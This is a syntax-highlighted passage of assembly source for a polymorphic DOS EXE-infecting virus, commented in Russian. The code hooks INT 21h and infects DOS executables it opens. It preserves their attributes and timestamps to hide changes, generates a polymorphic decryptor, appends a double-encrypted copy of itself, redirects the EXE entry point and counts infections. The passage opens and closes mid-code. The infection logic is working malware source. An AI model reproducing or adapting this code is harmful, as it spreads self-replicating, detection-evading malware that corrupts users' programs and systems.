        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MemSize</span><span class="sc0">
</span><span class="sc5">Key2</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">Loop04</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Loop04</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">SwapName</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'C:\WINA20.386'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">LoaderSize</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Loader</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">













</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;               ОБРАБОТЧИК INT 21h</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Int24h</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">


</span><span class="sc5">Int21h</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">


</span><span class="sc1">;[Сохраняем вектор Int 24h]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3524h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем свой обработчик Int 24h]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2524h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Int24h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">


</span><span class="sc1">;[Проверяем допустимость имени файла]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TestFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Quit3</span><span class="sc0">


</span><span class="sc1">;[Сохраняем атрибуты файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4300h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Quit3</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">


</span><span class="sc1">;[Обнуляем атрибуты файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestAttr</span><span class="sc0">


</span><span class="sc1">;[Открываем файл]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D02h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestAttr</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">


</span><span class="sc1">;[Сохраняем время и дату создания файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5700h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">Close4</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">


</span><span class="sc1">;[Считываем заголовок EXE и проверяем тип файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Header</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Read</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">L6</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">


</span><span class="sc1">;[Восстанавливаем дату и время создания файла]</span><span class="sc0">

</span><span class="sc5">RestTime</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5701h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">


</span><span class="sc1">;[Закрываем файл]</span><span class="sc0">

</span><span class="sc5">Close4</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">


</span><span class="sc1">;[Восстанавливаем атрибуты файла]</span><span class="sc0">

</span><span class="sc5">RestAttr</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">


</span><span class="sc1">;[Восстанавливаем вектор Int 24h]</span><span class="sc0">

</span><span class="sc5">Quit3</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2524h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">


</span><span class="sc1">;[Отдаем управление настоящему обработчику Int21h]</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc1">;[Устанавливаем указатель на 3Ch байт от начала файла]</span><span class="sc0">

</span><span class="sc5">L6</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Ch</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">


</span><span class="sc1">;[Считываем адрес NewEXE заголовка]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Read4b</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем указатель на NewEXE заголовок]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Temp</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Temp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">


</span><span class="sc1">;[Считываем первые четыре байта NewEXE заголовка]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Read4b</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">


</span><span class="sc1">;[Если NewEXE заголовок присутствует, то выходим]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NewEXE</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Temp</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CmpStr</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">


</span><span class="sc1">;[Содержит ли файл оверлеи?]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFSize</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Into512</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">RestTime</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">RestTime</span><span class="sc0">


</span><span class="sc1">;[Генерируем полиморфный расшифровщик]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">PoliGen</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">


</span><span class="sc1">;[Вычисляем длину файла с вирусом и вносим ее в заголовок EXE]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFSize</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTime</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Into512</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">


</span><span class="sc1">;[Сохраняем SS, SP, CS и IP]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">OldSS</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">OldSP</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">OldCS</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">OldIP</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">


</span><span class="sc1">;[Корректируем точку входа и адрес стека]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFSize</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTimeB</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Header</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc0">


</span><span class="sc1">;[Дописываем полиморфный расшифровщик к файлу]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Write</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTimeB</span><span class="sc0">


</span><span class="sc1">;[Копируем вирус в буффер]</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
</span><span class="sc5">Loop05</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Loop05</span><span class="sc0">


</span><span class="sc1">;[Получаем случайное число]</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Key4</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">


</span><span class="sc1">;[Первый раз шифруем вирус]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">)+(</span><span class="sc5">Crypt</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc4">-(</span><span class="sc5">Crypt</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Loop06</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Loop06</span><span class="sc0">


</span><span class="sc1">;[Второй раз шифруем вирус]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
</span><span class="sc5">Key3</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">Loop07</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Loop07</span><span class="sc0">


</span><span class="sc1">;[Записываем вирус]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Write</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTimeB</span><span class="sc0">


</span><span class="sc1">;[Записываем новый заголовок EXE]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SeekStart</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTimeB</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Header</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Write</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">RestTimeB</span><span class="sc0">


</span><span class="sc1">;[Увеличиваем счетчик заражений]</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Counter</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Counter</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">RestTimeB</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ShowDemo</span><span class="sc0">
</span><span class="sc5">RestTimeB</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">RestTime</span><span class="sc0">


</span><span class="sc5">NewEXE</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'NEPELELX'</span><span class="sc0">
</span><span class="sc5">Counter</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">













</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;               ПОДПРОГРАММЫ</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">GetFSize</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">SeekEnd</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
